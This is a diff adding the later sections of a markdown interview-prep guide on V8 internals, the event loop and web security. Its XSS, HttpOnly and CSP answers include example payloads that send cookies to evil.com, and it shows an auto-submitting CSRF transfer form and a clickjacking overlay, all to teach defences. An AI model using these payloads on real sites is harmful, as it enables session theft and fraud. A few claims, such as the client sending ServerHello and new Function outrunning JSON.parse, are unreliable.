@@ -1948,7 +1948,1123 @@ const p3 = new Point(5, 6);
 delete p3.x;  // ❌ Different hidden class, can't be optimized
 
 const p4 = new Point(7, 8);
-p4.z = 9;    // ❌ Different property
+p4.z = 9;    // ❌ Different property order → Different hidden class
 ```
 
+**Best Practices:**
+- Initialize all properties in constructor
+- Add properties in same order
+- Avoid `delete` operator
+- Keep object shapes consistent
+
+---
+
+### Q33: What is inline caching?
+
+**Inline Caching (IC)** = V8 optimization that remembers property access locations.
+
+**How it works:**
+```javascript
+function getName(obj) {
+  return obj.name;  // First call: lookup 'name' property
+}
+
+getName({ name: 'Alice' });  // Cache: "name is at offset 0"
+getName({ name: 'Bob' });    // Fast path: direct memory access
+```
+
+**Cache States:**
+
+1. **Uninitialized** - Never called
+2. **Monomorphic** - One object shape (fastest)
+   ```javascript
+   getName(user1);  // Shape A
+   getName(user2);  // Shape A → Monomorphic IC
+   ```
+
+3. **Polymorphic** - 2-4 object shapes (slower)
+   ```javascript
+   getName(user);     // Shape A
+   getName(admin);    // Shape B → Polymorphic IC
+   ```
+
+4. **Megamorphic** - 5+ shapes (slowest)
+   ```javascript
+   getName(obj1);  // Shape A
+   getName(obj2);  // Shape B
+   getName(obj3);  // Shape C
+   getName(obj4);  // Shape D
+   getName(obj5);  // Shape E → Megamorphic (dictionary lookup)
+   ```
+
+**Performance Impact:**
+- Monomorphic: ~1x (baseline)
+- Polymorphic: ~3x slower
+- Megamorphic: ~10x slower
+
+---
+
+### Q34: Why is `delete obj.key` slow?
+
+**Reasons:**
+
+1. **Changes Hidden Class**
+   ```javascript
+   const obj = { a: 1, b: 2, c: 3 };  // Hidden class C1
+   delete obj.b;                       // New hidden class C2
+   // C1 and C2 are different → No IC optimization
+   ```
+
+2. **Breaks Inline Caching** - Property offsets change
+3. **Forces Dictionary Mode** - Object becomes slow hash table
+4. **Triggers Deoptimization** - Any optimized code using this shape
+
+**Better Alternative:**
+```javascript
+// ❌ SLOW
+delete obj.key;
+
+// ✅ FAST
+obj.key = undefined;  // Keeps same hidden class
+obj.key = null;       // Keeps same hidden class
+```
+
+**When delete is necessary:**
+```javascript
+// Use null/undefined doesn't work for iteration
+for (let key in obj) {
+  // undefined values still appear
+}
+
+// Must use delete if you need to truly remove
+delete obj.key;
+```
+
+---
+
+### Q35: Explain call stack and memory heap.
+
+**Call Stack:**
+- **Stores:** Function execution contexts, local variables, return addresses
+- **Structure:** LIFO (Last In, First Out)
+- **Size:** Limited (typically ~1MB)
+- **Overflow:** Stack overflow error if too deep recursion
+
+```javascript
+function first() {
+  console.log('First');
+  second();
+}
+
+function second() {
+  console.log('Second');
+  third();
+}
+
+function third() {
+  console.log('Third');
+}
+
+first();
+
+// Call Stack:
+// [global]
+// [global] → [first]
+// [global] → [first] → [second]
+// [global] → [first] → [second] → [third]
+// [global] → [first] → [second]
+// [global] → [first]
+// [global]
+```
+
+**Memory Heap:**
+- **Stores:** Objects, closures, dynamic allocations
+- **Structure:** Unordered memory region
+- **Size:** Larger (GB range)
+- **Management:** Garbage collection
+
+**Memory Layout:**
+```
+Stack (grows down):        Heap (grows up):
+┌─────────────────┐       ┌─────────────────┐
+│ function frames │       │ {name: 'Alice'} │
+│ local variables │       │ [1, 2, 3, 4, 5] │
+│ primitives      │       │ function() {...}│
+└─────────────────┘       │ closures        │
+                          └─────────────────┘
+```
+
+---
+
+### Q36: How does garbage collection work in V8?
+
+**Generational GC Strategy:**
+
+**1. Young Generation (Small, Frequent)**
+- **Size:** ~1-8MB
+- **Algorithm:** Scavenger (Cheney's algorithm)
+- **Frequency:** Very frequent (milliseconds)
+- **Assumption:** Most objects die young
+
+**Process:**
+```
+Semi-space structure:
+┌──────────┬──────────┐
+│  From    │    To    │
+│ (active) │ (empty)  │
+└──────────┴──────────┘
+
+1. Allocate in "From" space
+2. When full, copy live objects to "To"
+3. Swap "From" and "To"
+4. Dead objects = freed
+```
+
+**2. Old Generation (Large, Infrequent)**
+- **Size:** ~100MB - 1GB+
+- **Algorithm:** Mark-Sweep-Compact
+- **Frequency:** When old space fills up
+- **Objects:** Survived 2+ young GC cycles
+
+**Mark-Sweep-Compact:**
+```
+1. Mark Phase: Traverse from roots, mark reachable objects
+2. Sweep Phase: Free unmarked objects
+3. Compact Phase: Move objects to eliminate fragmentation
+```
+
+**Optimizations:**
+- **Incremental Marking:** Spread marking over multiple frames
+- **Lazy Sweeping:** Sweep on-demand
+- **Concurrent Marking:** Mark on background thread
+- **Parallel Compaction:** Use multiple threads
+
+**When GC Runs:**
+- Young GC: ~every few milliseconds
+- Old GC: ~every few seconds
+- Triggered by allocation failure
+
+---
+
+### Q37: Difference between microtasks and macrotasks?
+
+**Task Queue Hierarchy:**
+
+```
+Event Loop:
+1. Execute one Macrotask
+2. Execute ALL Microtasks
+3. Render (if needed)
+4. Repeat
+```
+
+**Macrotasks (Task Queue):**
+- `setTimeout` / `setInterval`
+- `setImmediate` (Node.js)
+- I/O operations
+- UI rendering events
+- `MessageChannel.postMessage`
+
+**Microtasks (Job Queue):**
+- `Promise.then/catch/finally`
+- `queueMicrotask()`
+- `MutationObserver`
+- `process.nextTick` (Node.js - even higher priority)
+
+**Execution Example:**
+```javascript
+console.log('1: Sync');
+
+setTimeout(() => console.log('2: Macro 1'), 0);
+
+Promise.resolve().then(() => {
+  console.log('3: Micro 1');
+  setTimeout(() => console.log('4: Macro 2'), 0);
+});
+
+Promise.resolve().then(() => console.log('5: Micro 2'));
+
+setTimeout(() => console.log('6: Macro 3'), 0);
+
+console.log('7: Sync');
+
+// Output: 1 → 7 → 3 → 5 → 2 → 6 → 4
+```
+
+**Why Microtasks Run First:**
+- Higher priority than macrotasks
+- All microtasks cleared before next macrotask
+- Ensures promise resolution before rendering
+
+---
+
+### Q38: Why is async/await just syntactic sugar?
+
+**Under the Hood:** async/await compiles to promise chains and state machines.
+
+**Example:**
+```javascript
+// This code:
+async function fetchData() {
+  const result = await fetch('/api');
+  const data = await result.json();
+  return data;
+}
+
+// Becomes (simplified):
+function fetchData() {
+  return fetch('/api').then(result => {
+    return result.json();
+  }).then(data => {
+    return data;
+  });
+}
+```
+
+**State Machine Transformation:**
+```javascript
+async function example() {
+  console.log('A');
+  await Promise.resolve();
+  console.log('B');
+  await Promise.resolve();
+  console.log('C');
+}
+
+// Transforms to state machine:
+// State 0: Execute until first await
+// State 1: Execute until second await
+// State 2: Execute until return
+```
+
+**Key Points:**
+- `async` function always returns a Promise
+- `await` pauses execution, schedules as microtask
+- Error handling with try/catch = `.catch()`
+- Still uses microtask queue under the hood
+
+**No Performance Difference:**
+```javascript
+// Same performance
+await promise;
+promise.then(value => ...);
+```
+
+---
+
+### Q39: How does debouncing differ from throttling?
+
+**Debouncing:** Execute AFTER rapid events stop
+
+```javascript
+// Debounce: Wait for typing to stop
+function debounce(fn, delay) {
+  let timeoutId;
+  return function(...args) {
+    clearTimeout(timeoutId);
+    timeoutId = setTimeout(() => fn.apply(this, args), delay);
+  };
+}
+
+const searchInput = debounce((query) => {
+  fetch(`/search?q=${query}`);
+}, 300);
+
+// User types: h-e-l-l-o
+// Only fires API call 300ms after "o"
+```
+
+**Throttling:** Execute AT MOST once per time period
+
+```javascript
+// Throttle: Limit execution rate
+function throttle(fn, limit) {
+  let inThrottle;
+  return function(...args) {
+    if (!inThrottle) {
+      fn.apply(this, args);
+      inThrottle = true;
+      setTimeout(() => inThrottle = false, limit);
+    }
+  };
+}
+
+const onScroll = throttle(() => {
+  console.log('Scroll position:', window.scrollY);
+}, 100);
+
+// Fires at most every 100ms while scrolling
+```
+
+**Comparison:**
+
+| Feature | Debounce | Throttle |
+|---------|----------|----------|
+| **When fires** | After silence period | At regular intervals |
+| **Use case** | Search input, resize | Scroll, mousemove |
+| **Events during** | Ignored | Some executed |
+| **Last event** | Always fires | May be dropped |
+
+**Visual Timeline:**
+```
+Events:  ↓ ↓ ↓ ↓ ↓     ↓ ↓     ↓ ↓ ↓
+         [Rapid]       [Gap]   [Rapid]
+
+Debounce:              ↓       ↓        ↓
+         (waits for silence)
+
+Throttle: ↓     ↓      ↓       ↓     ↓
+         (fires at intervals)
+```
+
+---
+
+### Q40: Why is JSON.parse fast?
+
+**Reasons:**
+
+1. **Native Implementation** - Written in optimized C++, not JavaScript
+2. **Specialized Parser** - Purpose-built for JSON syntax only
+3. **No Security Checks** - Unlike `eval()`, doesn't execute code
+4. **Streaming Capable** - Can parse incrementally
+5. **No Validation Overhead** - Assumes valid JSON (throws on invalid)
+
+**Performance Comparison:**
+```javascript
+// ❌ SLOW (1000ms for 10MB)
+const obj = eval('(' + jsonString + ')');  // Security risk!
+
+// ✅ FAST (100ms for 10MB)
+const obj = JSON.parse(jsonString);
+
+// 🚀 FASTER (50ms for 10MB with large objects)
+// V8 optimization for object literals
+const obj = new Function('return ' + jsonString)();  // Still risky
+```
+
+**V8 Optimization:**
+- Fast path for common patterns
+- Avoids creating intermediate strings
+- Direct memory allocation for result
+
+**When JSON.parse is slow:**
+```javascript
+// Large nested structures
+const deepObject = JSON.parse(veryLargeJSON);  // May cause GC pressure
+
+// Better: Stream parse or chunk processing
+```
+
+---
+
+## 4. Security Internals (10 Questions)
+
+### Q41: What is XSS?
+
+**XSS (Cross-Site Scripting)** = Injecting malicious scripts into trusted websites.
+
+**Types:**
+
+**1. Reflected XSS (Non-persistent)**
+```javascript
+// URL: https://site.com/search?q=<script>alert(document.cookie)</script>
+// Server reflects input directly:
+<div>Results for: <script>alert(document.cookie)</script></div>
+```
+
+**2. Stored XSS (Persistent)**
+```javascript
+// Attacker posts comment:
+<script>
+  fetch('https://evil.com/steal?cookie=' + document.cookie);
+</script>
+
+// Stored in database, executed for every viewer
+```
+
+**3. DOM-based XSS**
+```javascript
+// Vulnerable code:
+const username = location.hash.substring(1);
+document.getElementById('welcome').innerHTML = 'Hello ' + username;
+
+// Attack: https://site.com#<img src=x onerror="alert('XSS')">
+```
+
+**Prevention:**
+
+1. **Escape Output**
+```javascript
+// ✅ Escape HTML
+function escapeHTML(str) {
+  return str.replace(/[&<>"']/g, (char) => ({
+    '&': '&amp;',
+    '<': '&lt;',
+    '>': '&gt;',
+    '"': '&quot;',
+    "'": '&#39;'
+  })[char]);
+}
+```
+
+2. **Content Security Policy**
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
+```
+
+3. **Use textContent instead of innerHTML**
+```javascript
+// ❌ Vulnerable
+element.innerHTML = userInput;
+
+// ✅ Safe
+element.textContent = userInput;
+```
+
+4. **Sanitize with DOMPurify**
+5. **HttpOnly cookies** (prevent script access)
+6. **Trusted Types API**
+
+---
+
+### Q42: What is CSRF?
+
+**CSRF (Cross-Site Request Forgery)** = Attacker tricks authenticated user's browser into making unwanted requests.
+
+**Attack Example:**
+```html
+<!-- Attacker's site -->
+<img src="https://bank.com/transfer?to=attacker&amount=1000">
+
+<!-- Or hidden form -->
+<form action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="1000">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+**Why it works:**
+- Browser automatically sends cookies with request
+- Bank sees authenticated session
+- Request appears legitimate
+
+**Prevention:**
+
+**1. CSRF Tokens (Synchronizer Token)**
+```html
+<!-- Server generates unique token -->
+<form action="/transfer" method="POST">
+  <input type="hidden" name="csrf_token" value="random_token_123">
+  <input name="amount" value="100">
+  <button>Transfer</button>
+</form>
+
+<!-- Server validates token on submission -->
+```
+
+**2. SameSite Cookies**
+```http
+Set-Cookie: session=abc123; SameSite=Strict; HttpOnly; Secure
+```
+
+**3. Custom Headers**
+```javascript
+// AJAX requests can use custom headers
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: {
+    'X-CSRF-Token': token,  // Attacker can't set this cross-origin
+    'Content-Type': 'application/json'
+  }
+});
+```
+
+**4. Origin/Referer Validation**
+```javascript
+// Server checks
+if (request.headers.origin !== 'https://trusted-site.com') {
+  throw new Error('Invalid origin');
+}
+```
+
+**5. Double Submit Cookie**
+```javascript
+// Token in both cookie and request body
+document.cookie = 'csrf_token=abc123';
+fetch('/api', {
+  body: JSON.stringify({ csrf_token: 'abc123' })
+});
+```
+
+---
+
+### Q43: What is Same-Origin Policy?
+
+**Same-Origin Policy (SOP)** = Browser security that isolates content from different origins.
+
+**Origin Definition:**
+```
+Origin = Protocol + Domain + Port
+
+https://example.com:443/page
+└─┬─┘   └────┬────┘ └┬┘
+Protocol  Domain    Port
+```
+
+**Same-Origin Examples:**
+```
+Origin: https://example.com
+
+✅ Same Origin:
+https://example.com/page
+https://example.com:443/different
+
+❌ Different Origin:
+http://example.com        (different protocol)
+https://api.example.com   (different subdomain)
+https://example.com:8080  (different port)
+https://example.org       (different domain)
+```
+
+**What SOP Restricts:**
+
+1. **DOM Access**
+```javascript
+// ❌ Blocked: Different origin iframe
+iframe.contentDocument.body.innerHTML;
+```
+
+2. **Cookies**
+```javascript
+// ❌ Can't read cookies from different origin
+document.cookie; // Only same-origin
+```
+
+3. **XMLHttpRequest/Fetch**
+```javascript
+// ❌ Blocked without CORS
+fetch('https://api.different-domain.com/data');
+```
+
+4. **LocalStorage/SessionStorage**
+```javascript
+// Each origin has isolated storage
+localStorage.getItem('key'); // Origin-specific
+```
+
+**Why SOP Exists:**
+- Prevents malicious site from reading sensitive data
+- Isolates trust boundaries
+- Protects user privacy and security
+
+**Exceptions:**
+- CORS (opt-in relaxation)
+- postMessage (controlled cross-origin communication)
+- JSONP (legacy, insecure)
+
+---
+
+### Q44: Why does CORS exist?
+
+**CORS (Cross-Origin Resource Sharing)** = Controlled relaxation of Same-Origin Policy.
+
+**The Problem:**
+```javascript
+// Before CORS, all cross-origin requests blocked
+fetch('https://api.example.com/data'); // ❌ Blocked by SOP
+```
+
+**The Solution:**
+Server explicitly allows cross-origin access via headers.
+
+**CORS Headers:**
+```http
+# Server response
+Access-Control-Allow-Origin: https://trusted-site.com
+Access-Control-Allow-Methods: GET, POST, PUT
+Access-Control-Allow-Headers: Content-Type, Authorization
+Access-Control-Allow-Credentials: true
+Access-Control-Max-Age: 86400
+```
+
+**Why CORS, not just disable SOP?**
+
+1. **Opt-in Security** - Server chooses to share resources
+2. **Prevents Data Theft** - Attacker can't arbitrarily read APIs
+3. **Backward Compatible** - Doesn't break existing security
+4. **Granular Control** - Specify exactly what's allowed
+
+**Without CORS:**
+```javascript
+// Malicious site could do:
+fetch('https://yourbank.com/account')
+  .then(res => res.json())
+  .then(data => sendToAttacker(data)); // ❌ Blocked!
+```
+
+**With CORS (when appropriate):**
+```javascript
+// Public API explicitly allows access
+fetch('https://public-api.com/weather')
+  .then(res => res.json()); // ✅ Allowed by server
+```
+
+---
+
+### Q45: How do HTTPS and HSTS protect users?
+
+**HTTPS (HTTP Secure):**
+
+**Protection:**
+1. **Encryption** - Data encrypted in transit (TLS/SSL)
+2. **Authentication** - Certificate proves server identity
+3. **Integrity** - Detects tampering via cryptographic hashes
+
+**TLS Handshake:**
+```
+Client → ServerHello (certificate)
+Client validates certificate chain
+Client ← Server agree on cipher suite
+Encrypted communication begins
+```
+
+**HSTS (HTTP Strict Transport Security):**
+
+**Header:**
+```http
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+```
+
+**Protection:**
+
+1. **Forces HTTPS**
+```
+User types: http://example.com
+Browser automatically upgrades to: https://example.com
+```
+
+2. **Prevents Downgrade Attacks**
+```
+Attacker tries: Strip HTTPS → serve HTTP
+Browser rejects: "HSTS policy requires HTTPS"
+```
+
+3. **Preload List**
+- Hardcoded in browsers (Chrome, Firefox, Safari)
+- HTTPS enforced even on first visit
+- Submit at: hstspreload.org
+
+**Attack Prevented:**
+```
+❌ Without HSTS:
+User → http://bank.com → [Attacker MITM] → http://fake-bank.com
+
+✅ With HSTS:
+User → http://bank.com → [Browser] → https://bank.com (forced)
+```
+
+**Best Practice:**
+```http
+# After HTTPS is working, enable HSTS
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+```
+
+---
+
+### Q46: What is a preflight request?
+
+**Preflight** = Browser sends OPTIONS request before actual request to verify CORS permissions.
+
+**When Preflight Happens:**
+
+**Simple Requests (No Preflight):**
+- Methods: GET, HEAD, POST
+- Headers: Accept, Accept-Language, Content-Language
+- Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain
+
+**Complex Requests (Requires Preflight):**
+- Methods: PUT, DELETE, PATCH
+- Custom headers: Authorization, X-Custom-Header
+- Content-Type: application/json, application/xml
+
+**Preflight Flow:**
+
+```http
+# 1. Browser sends OPTIONS
+OPTIONS /api/data HTTP/1.1
+Host: api.example.com
+Origin: https://app.example.com
+Access-Control-Request-Method: DELETE
+Access-Control-Request-Headers: Authorization, Content-Type
+
+# 2. Server responds
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://app.example.com
+Access-Control-Allow-Methods: GET, POST, DELETE
+Access-Control-Allow-Headers: Authorization, Content-Type
+Access-Control-Max-Age: 86400
+
+# 3. Browser sends actual request
+DELETE /api/data HTTP/1.1
+Host: api.example.com
+Authorization: Bearer token123
+```
+
+**Caching:**
+```http
+Access-Control-Max-Age: 86400  # Cache preflight for 24 hours
+```
+
+**Performance Impact:**
+- Adds 1 RTT for complex requests
+- Mitigate with preflight caching
+- Consider simple requests where possible
+
+---
+
+### Q47: Why are HttpOnly cookies secure?
+
+**HttpOnly Flag** = Cookie cannot be accessed by JavaScript.
+
+**Security Benefit:**
+```javascript
+// ❌ Without HttpOnly
+document.cookie; // "session=abc123; user=admin"
+// XSS attacker can steal: fetch('https://evil.com?c=' + document.cookie)
+
+// ✅ With HttpOnly
+document.cookie; // "user=admin" (session cookie hidden)
+// XSS attacker can't access session token
+```
+
+**Setting HttpOnly:**
+```http
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+**What HttpOnly Prevents:**
+- XSS cookie theft
+- Session hijacking via JavaScript
+- Client-side cookie manipulation
+
+**What HttpOnly Doesn't Prevent:**
+- CSRF (need SameSite or tokens)
+- Network sniffing (need Secure flag)
+- Server-side vulnerabilities
+
+**Best Practice:**
+```http
+# Authentication cookies should always be:
+Set-Cookie: session=token; 
+  HttpOnly;           # No JS access
+  Secure;            # HTTPS only
+  SameSite=Strict;   # No cross-site
+  Max-Age=3600;      # Expire after 1 hour
+  Path=/;            # Available site-wide
+```
+
+---
+
+### Q48: Explain Content Security Policy.
+
+**CSP** = HTTP header that specifies trusted sources for content.
+
+**Header Syntax:**
+```http
+Content-Security-Policy: directive1 source1 source2; directive2 source3
+```
+
+**Common Directives:**
+
+**1. script-src** (most important)
+```http
+# Only allow scripts from same origin
+Content-Security-Policy: script-src 'self'
+
+# Allow specific domains
+Content-Security-Policy: script-src 'self' https://cdn.example.com
+
+# Allow inline scripts with nonce
+Content-Security-Policy: script-src 'self' 'nonce-random123'
+<script nonce="random123">alert('allowed')</script>
+
+# Allow specific hash
+Content-Security-Policy: script-src 'self' 'sha256-hash...'
+```
+
+**2. default-src** (fallback for all)
+```http
+Content-Security-Policy: default-src 'self'
+```
+
+**3. Other Directives**
+```http
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-abc123';
+  style-src 'self' https://fonts.googleapis.com;
+  img-src 'self' data: https:;
+  font-src 'self' https://fonts.gstatic.com;
+  connect-src 'self' https://api.example.com;
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'self'
+```
+
+**XSS Mitigation:**
+```javascript
+// ❌ Without CSP: Injected script executes
+<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
+
+// ✅ With CSP: Blocked
+Content-Security-Policy: script-src 'self'
+// Console error: "Refused to execute inline script"
+```
+
+**Report-Only Mode (Testing):**
+```http
+Content-Security-Policy-Report-Only: default-src 'self'
+```
+
+**Upgrade Insecure Requests:**
+```http
+Content-Security-Policy: upgrade-insecure-requests
+```
+
+---
+
+### Q49: How does OAuth prevent password sharing?
+
+**OAuth** = Authorization framework that eliminates password sharing.
+
+**Traditional Flow (Insecure):**
+```
+User → Types password into Third-Party App
+App → Stores password
+App → Logs in as user (full access forever)
+```
+
+**OAuth Flow (Secure):**
+```
+1. User clicks "Login with Google"
+2. Redirected to Google (identity provider)
+3. User authenticates with Google directly
+4. Google asks: "Allow ThirdPartyApp to access your email?"
+5. User approves
+6. Google returns authorization code to ThirdPartyApp
+7. ThirdPartyApp exchanges code for access token
+8. ThirdPartyApp uses token to access user data
+```
+
+**Benefits:**
+
+1. **No Password Sharing**
+   - App never sees user's password
+   - Password stays with identity provider
+
+2. **Limited Scope**
+```javascript
+// App requests only what it needs
+scope: "read:email read:profile"
+// Not full account access
+```
+
+3. **Revocable**
+```
+User can revoke access anytime
+Token expires automatically
+```
+
+4. **Auditable**
+```
+Identity provider logs all access
+User can see which apps have access
+```
+
+**OAuth 2.0 Grant Types:**
+
+**1. Authorization Code (most secure)**
+```
+Best for: Server-side apps
+Flow: code → exchange for token
+```
+
+**2. Implicit (deprecated)**
+```
+Token in URL fragment (insecure)
+```
+
+**3. Client Credentials**
+```
+Best for: Machine-to-machine
+No user involved
+```
+
+**4. PKCE (Proof Key for Code Exchange)**
+```
+Best for: Mobile/SPA apps
+Prevents authorization code interception
+```
+
+---
+
+### Q50: What is clickjacking? How to prevent it?
+
+**Clickjacking** = Attacker overlays invisible iframe to trick users into clicking hidden elements.
+
+**Attack Example:**
+```html
+<!-- Attacker's malicious page -->
+<style>
+  iframe {
+    position: absolute;
+    width: 500px;
+    height: 500px;
+    opacity: 0;  /* Invisible */
+    z-index: 2;
+  }
+  button {
+    position: absolute;
+    top: 100px;
+    left: 100px;
+    z-index: 1;
+  }
+</style>
+
+<iframe src="https://bank.com/transfer"></iframe>
+<button>Click for free iPhone!</button>
+
+<!-- User clicks button, actually clicking hidden "Confirm Transfer" -->
+```
+
+**Real Attack Scenarios:**
+- Like/share social media posts
+- Delete account buttons
+- Change privacy settings
+- Authorize payments
+
+**Prevention:**
+
+**1. X-Frame-Options Header**
+```http
+# Prevent framing entirely
+X-Frame-Options: DENY
+
+# Allow same-origin framing
+X-Frame-Options: SAMEORIGIN
+
+# Allow specific origin
+X-Frame-Options: ALLOW-FROM https://trusted-site.com
+```
+
+**2. CSP frame-ancestors Directive (Preferred)**
+```http
+# More flexible than X-Frame-Options
+Content-Security-Policy: frame-ancestors 'none'
+Content-Security-Policy: frame-ancestors 'self'
+Content-Security-Policy: frame-ancestors https://trusted-site.com
+```
+
+**3. JavaScript Frame Busting (Weak)**
+```javascript
+// ❌ Can be bypassed
+if (top !== self) {
+  top.location = self.location;
+}
+```
+
+**4. SameSite Cookies**
+```http
+# Helps prevent CSRF within clickjacking
+Set-Cookie: session=abc; SameSite=Strict
+```
+
+**Best Practice:**
+```http
+# Use both for maximum compatibility
+X-Frame-Options: DENY
+Content-Security-Policy: frame-ancestors 'none'
+```
+
+**Testing:**
+```html
+<!-- Try to embed your site -->
+<iframe src="https://yoursite.com"></iframe>
+<!-- Should be blocked if protection works -->
+```
+
+---
+
+## Summary & Study Tips
+
+### Priority Topics by Role
+
+**Frontend Engineer:**
+- Critical Rendering Path (Q16-30)
+- Event Loop & JavaScript Engine (Q31-40)
+- CORS & Basic Security (Q10-11, Q41-44)
+
+**Senior Frontend Engineer:**
+- Browser Architecture (Q1-9)
+- Performance Optimization (Q16-30)
+- Security Deep Dive (Q41-50)
+
+**Staff/Principal Engineer:**
+- All 50 questions
+- Ability to explain tradeoffs
+- System design implications
+
+### Study Approach
+
+1. **Understand, Don't Memorize**
+   - Trace complete flows (URL → pixels)
+   - Draw diagrams for complex topics
+   - Explain to someone else
+
+2. **Hands-On Practice**
+   - Use Chrome DevTools Performance tab
+   - Inspect network waterfalls
+   - Create test cases for security issues
+
+3. **Connect Concepts**
+   - How do layers relate to performance?
+   - Why does SOP require CORS?
+   - How does V8 optimization affect coding patterns?
+
+4. **Stay Current**
+   - Web APIs evolve (INP replaced FID)
+   - New browser features (HTTP/3, QUIC)
+   - Security best practices change
+
+### Key Resources
+
+- **Chrome DevTools Documentation**
+- **web.dev** (Google's performance guides)
+- **MDN Web Docs** (comprehensive reference)
+- **V8 Blog** (engine internals)
+- **OWASP** (security best practices)
+
+### Interview Preparation
+
+**Common Question Patterns:**
+- "What happens when..." (trace complete flows)
+- "Why is X slow/fast?" (understand performance)
+- "How would you optimize..." (practical problem-solving)
+- "Explain the difference between..." (compare concepts)
+- "What security risks..." (threat modeling)
+
+**Red Flags to Avoid:**
+- Saying "I don't know" without attempting
+- Memorized answers without understanding
+- Ignoring tradeoffs or edge cases
+- Not asking clarifying questions
+
+**Success Strategies:**
+- Think aloud during answers
+- Draw diagrams when helpful
+- Admit uncertainty but reason through
+- Connect to real-world experience
+
+---
 *Good luck with your interviews! Master the fundamentals, understand the tradeoffs, and always be ready to explain the "why" behind technical decisions.*
